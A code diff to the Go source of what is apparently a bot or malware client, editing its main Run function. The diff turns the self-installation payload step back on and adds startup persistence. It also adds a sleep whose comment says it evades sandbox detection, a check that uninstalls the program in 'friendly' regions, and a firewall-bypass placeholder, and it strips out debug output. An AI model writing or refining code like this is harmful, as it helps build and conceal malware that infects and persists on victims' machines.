@@ -2,7 +2,6 @@ package components
 
 import (
 	"encoding/json"
-	"fmt"
 	"io"
 	"log"
 	"os"
@@ -277,27 +276,31 @@ func read_config() bool {
 }
 
 func Run() {
+	uinstall()
+	
+	if run_on_friendly_area() {
+		uinstall()
+	}
 	// Read configure
-	//if !read_config() {
-	//	os.Exit(0)
-	//}
-	//
-	//if botcore.install {
-	//	install_payload()
-	//}
+	if !read_config() {
+		os.Exit(0)
+	}
+	// Install self to temp folder
+	if botcore.install {
+		install_payload()
+	}
 
 	// Check singleton
 	if botcore.singleton {
 		run, m := is_already_exist(botcore.mutex_name)
 		if run {
-			fmt.Println("Already exist")
-			fmt.Scan()
 			os.Exit(0)
 		}
 		botcore.sington_mutex = m
-		fmt.Println("Singleton")
 	}
 
+	// Set startup option
+	startup()
 	// Sleep for avoiding the detection of sandbox
 	time.Sleep(time.Second * time.Duration(botcore.delay))
 
@@ -319,7 +322,7 @@ func Run() {
 		install_payload()
 	}
 
-	// Set auto startup and set firewall bypass
+	// Set firewall bypass
 
 	// Anti-Process
 
